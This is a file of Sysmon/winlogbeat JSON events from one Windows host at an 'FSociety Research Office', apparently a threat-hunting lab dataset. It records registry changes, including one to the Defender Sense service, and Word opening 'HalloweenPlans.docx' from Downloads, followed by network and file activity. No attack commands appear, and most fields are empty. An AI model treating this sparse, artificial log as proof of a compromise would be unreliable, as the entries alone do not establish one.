{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\services.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:31","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:31","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Services\\Sense\\Start","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:31","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:31","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:33","winlog.event_data.CommandLine":"C:\\Windows\\System32\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\SecurityHealthHost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:35","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:35","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:35","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:35","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:43","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:43","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:00","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:00","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:26","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:26","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:26","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:26","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:28","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:28","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":"S-1-5-21-1901252624-1317086816-3136730465-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftEdgeAutoLaunch_5EFC0ECB77A7585FE9DCDD0B2E946A2B","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:44","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:44","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:52","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:52","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:52","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:52","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:52","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:52","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:52","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:52","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:53","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:53","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:53","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:53","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:54","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:54","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File stream created (rule: FileCreateStreamHash)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:56","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:56","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:36:57","winlog.event_data.CommandLine":"C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:36:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:04","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:04","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:04","winlog.event_data.CommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\Explorer.EXE","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:04","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:06","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:06","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:08","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:08","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:10","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:10","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:12","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:12","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:12","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:12","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:14","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:14","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:14","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:14","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:15","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:15","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:20","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:20","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
